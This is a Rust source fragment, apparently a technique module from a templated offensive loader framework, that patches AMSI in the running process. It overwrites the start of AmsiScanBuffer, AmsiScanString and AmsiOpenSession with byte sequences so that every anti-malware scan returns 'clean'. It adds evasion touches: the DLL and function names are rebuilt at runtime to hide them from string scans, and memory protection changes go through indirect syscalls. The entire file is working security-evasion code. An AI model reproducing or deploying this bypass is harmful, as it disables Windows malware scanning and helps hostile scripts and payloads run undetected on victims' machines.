// --- AMSI patch (technique fragment) ---

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::Win32::System::Threading::GetCurrentProcess;

/// Whether to also patch the string-entry scan (best effort).
const PATCH_SCAN_STRING: bool = $PATCH_SCAN_STRING$;

/// Whether to also patch session opening (best effort).
const PATCH_OPEN_SESSION: bool = $PATCH_OPEN_SESSION$;

/// The bytes written over `AmsiScanBuffer`'s prologue.
///
/// It returns `S_OK` (`eax = 0`) *and* stores `AMSI_RESULT_CLEAN` (0) in the
/// sixth argument (the caller's `AMSI_RESULT*`), so a caller that reads the
/// result — `System.Management.Automation` does, on every script it compiles —
/// sees "clean" instead of uninitialized memory.
#[cfg(target_arch = "x86_64")]
const AMSI_SCAN_BUFFER_PATCH: [u8; 11] = [
    0x29, 0xC0, // sub eax, eax
    0x4C, 0x8B, 0x54, 0x24, 0x30, // mov r10, [rsp+0x30]  (6th arg: AMSI_RESULT*)
    0x41, 0x89, 0x02, // mov [r10], eax
    0xC3, // ret
];

/// The 32-bit variant: the `AMSI_RESULT*` is the sixth stack argument and the
/// `stdcall` callee pops all six (24 bytes).
#[cfg(target_arch = "x86")]
const AMSI_SCAN_BUFFER_PATCH: [u8; 11] = [
    0x31, 0xC0, // xor eax, eax
    0x8B, 0x54, 0x24, 0x18, // mov edx, [esp+0x18]  (6th arg: AMSI_RESULT*)
    0x89, 0x02, // mov [edx], eax
    0xC2, 0x18, 0x00, // ret 0x18
];

/// The bytes written over `AmsiScanString`'s prologue: the same shape as the
/// buffer scan, but the `AMSI_RESULT*` is the *fifth* argument (the string sits
/// where the buffer length sits in `AmsiScanBuffer`).
#[cfg(target_arch = "x86_64")]
const AMSI_SCAN_STRING_PATCH: [u8; 11] = [
    0x29, 0xC0, // sub eax, eax
    0x4C, 0x8B, 0x54, 0x24, 0x28, // mov r10, [rsp+0x28]  (5th arg: AMSI_RESULT*)
    0x41, 0x89, 0x02, // mov [r10], eax
    0xC3, // ret
];

/// The 32-bit variant pops five arguments (20 bytes).
#[cfg(target_arch = "x86")]
const AMSI_SCAN_STRING_PATCH: [u8; 11] = [
    0x31, 0xC0, // xor eax, eax
    0x8B, 0x54, 0x24, 0x14, // mov edx, [esp+0x14]  (5th arg: AMSI_RESULT*)
    0x89, 0x02, // mov [edx], eax
    0xC2, 0x14, 0x00, // ret 0x14
];

/// The bytes written over `AmsiOpenSession`'s prologue: return `S_OK` and store
/// a null session in the caller's `HAMSISESSION*` (the second argument). A null
/// session is harmless because the scan exports are patched too, so it is never
/// dereferenced.
#[cfg(target_arch = "x86_64")]
const AMSI_OPEN_SESSION_PATCH: [u8; 5] = [
    0x29, 0xC0, // sub eax, eax
    0x89, 0x02, // mov [rdx], eax  (rdx is the 2nd arg: HAMSISESSION*)
    0xC3, // ret
];

/// The 32-bit `stdcall` variant pops two arguments (8 bytes).
#[cfg(target_arch = "x86")]
const AMSI_OPEN_SESSION_PATCH: [u8; 11] = [
    0x31, 0xC0, // xor eax, eax
    0x8B, 0x54, 0x24, 0x08, // mov edx, [esp+8]  (2nd arg: HAMSISESSION*)
    0x89, 0x02, // mov [edx], eax
    0xC2, 0x08, 0x00, // ret 8
];

/// Patches the AMSI scan exports in the current process so every scan reports
/// clean.
///
/// Each patch returns `S_OK` **and** stores `AMSI_RESULT_CLEAN` (0) in the
/// caller's out-parameter. Writing only `sub eax, eax; ret` leaves that
/// parameter untouched, and a caller that reads it (`System.Management.Automation`
/// does, on every script it compiles) then sees uninitialized memory — which
/// makes the scan result non-deterministic.
///
/// `AmsiScanBuffer` failing aborts the preparation; the string scan and session
/// open are best effort, because not every `amsi.dll` exports them.
///
/// The DLL and function names are substituted at build time by
/// `Params::render_fragment` with code that rebuilds them at runtime, so they
/// do not appear in `strings`. The page protection changes go through the
/// syscall layer's `nt_protect_vm`, so `mode: indirect` removes the
/// `VirtualProtect` import.
pub fn patch_amsi() -> Result<bool, String> {
    patch_export(&$AMSI_DLL_DEF$, &$AMSI_FUNC_DEF$, &AMSI_SCAN_BUFFER_PATCH)?;
    if PATCH_SCAN_STRING {
        patch_optional(
            &$AMSI_DLL_DEF$,
            &$AMSI_SCAN_STRING_FUNC_DEF$,
            &AMSI_SCAN_STRING_PATCH,
        );
    }
    if PATCH_OPEN_SESSION {
        patch_optional(
            &$AMSI_DLL_DEF$,
            &$AMSI_OPEN_SESSION_FUNC_DEF$,
            &AMSI_OPEN_SESSION_PATCH,
        );
    }

    // A Preparation always continues the pipeline; only the `bouncer` gate
    // decides to abort (see `techniques/README.md`).
    Ok(true)
}

/// Patches an optional export, logging and ignoring a failure: a missing
/// secondary export must not discard a working main patch.
fn patch_optional(dll: &str, func: &str, patch: &[u8]) {
    if let Err(error) = patch_export(dll, func, patch) {
        crate::tech_dbg!("patch_amsi", "optional export {func} skipped: {error}");
    }
}

/// Resolves `func` in `dll` and overwrites its prologue with `patch`.
fn patch_export(dll_name: &str, export_name: &str, patch: &[u8]) -> Result<(), String> {
    crate::tech_dbg!("patch_amsi", "patching {dll_name}!{export_name}");

    let dll = std::ffi::CString::new(dll_name).map_err(|_| $MSG_LOAD_FAILED$)?;
    let func = std::ffi::CString::new(export_name).map_err(|_| $MSG_LOAD_FAILED$)?;

    // 1. Load the library (a no-op if it is already loaded).
    let module = unsafe { LoadLibraryA(PCSTR(dll.as_ptr() as *const u8)) }
        .map_err(|_| $MSG_LOAD_FAILED$)?;

    // 2. Resolve the export.
    let address = unsafe { GetProcAddress(module, PCSTR(func.as_ptr() as *const u8)) };
    let address = address.ok_or($MSG_RESOLVE_FAILED$)?;
    let target = address as usize as *mut u8;
    crate::tech_dbg!("patch_amsi", "resolved target at {target:p}");

    // 3. Make the patch bytes writable. Each patch is longer than a `ret`:
    //    besides returning `S_OK` it also writes the caller's out-parameter, so
    //    a scan never reports uninitialized memory.
    let mut old_protect = 0u32;
    let status = crate::nt_protect_vm(
        unsafe { GetCurrentProcess() },
        target as *mut core::ffi::c_void,
        patch.len(),
        PAGE_EXECUTE_READWRITE.0,
        &mut old_protect,
    );
    if status < 0 {
        return Err($MSG_MAKE_WRITABLE_FAILED$);
    }

    // 4. Write the patch.
    unsafe {
        std::ptr::copy_nonoverlapping(patch.as_ptr(), target, patch.len());
    }

    // 5. Restore the original protection.
    let status = crate::nt_protect_vm(
        unsafe { GetCurrentProcess() },
        target as *mut core::ffi::c_void,
        patch.len(),
        old_protect,
        &mut old_protect,
    );
    if status < 0 {
        return Err($MSG_RESTORE_PROTECTION_FAILED$);
    }
    crate::tech_dbg!(
        "patch_amsi",
        "wrote {} patch bytes into {export_name} and restored the original protection",
        patch.len()
    );

    Ok(())
}
